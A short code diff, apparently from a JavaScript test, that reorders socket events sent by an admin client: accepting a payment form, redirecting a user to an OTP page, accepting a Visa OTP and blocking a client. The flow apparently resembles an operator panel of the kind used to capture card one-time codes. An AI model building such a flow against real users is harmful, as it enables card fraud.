@@ -136,8 +136,8 @@ await new Promise((resolve, reject) => {
 for (const [event, payload] of [
   ["acceptPaymentForm", { id: uuid }],
   ["adminRedirect", { uuid, page: "/otp", pageName: "OTP" }],
-  ["clientBlocked", { userId: uuid, message: "blocked" }],
   ["acceptVisaOtp", { targetUserId: uuid }],
+  ["clientBlocked", { userId: uuid, message: "blocked" }],
 ]) {
   await new Promise((resolve) =>
     admin.timeout(5000).emit(event, payload, (error, response) => {
